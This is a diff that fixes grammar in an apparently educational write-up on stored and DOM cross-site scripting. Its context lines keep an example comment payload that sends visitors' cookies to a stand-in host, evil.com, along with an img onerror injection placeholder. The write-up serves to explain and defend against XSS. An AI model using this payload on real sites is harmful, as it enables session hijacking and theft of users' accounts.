@@ -45,7 +45,7 @@ _Image from [Christopher Makarem](https://medium.com/iocscan/persistent-cross-si
 
 ### Keys
 
-Also known as stored XSS. The malicious script comes from the website's database, so this attack require few steps to succeed.
+Also known as stored XSS. The malicious script comes from the website's database, so this attack requires few steps to succeed.
 
 - In the first step the attacker will add a malicious payload to the server (so it will be stored).
 - Later on the victims will access to the site and the malicious payload will be downloaded together with the legitimate content.
@@ -54,13 +54,13 @@ This attack can lead to Cookie theft, KeyLogging, Phishing...
 
 ### Example
 
-The attacker add a malicious payload in the comments section of the site.
+The attacker adds a malicious payload in the comments section of the site.
 
 ```
 POST "http://website.com/blog/post-1/comment", body{"<script>window.location='http://evil.com/?c='+document.cookie</script>}
 ```
 
-So any user that visits the website will be vulnerable once this malicious comment is loaded.
+Any user that visits the website will be vulnerable once this malicious comment is loaded.
 
 
 ## DOM XSS
@@ -71,7 +71,7 @@ _Image from [Christopher Makarem](https://medium.com/iocscan/dom-based-cross-sit
 
 ### Keys 
 
-If the attacker control any input field value, they can easily add malicious values:
+If the attacker controls any input field value, they can easily add malicious values:
 
 ```js
 const search = document.getElementById('search').value;
@@ -90,7 +90,7 @@ You searched for: <img src=error onerror='/* Evil payload */'>
 
 ## The solution
 
-There are no definitive solutions to avoid this attack but can be highly mitigated.
+There are no definitive solutions to avoid this attack but it can be highly mitigated.
 
 ## Mitigation
 
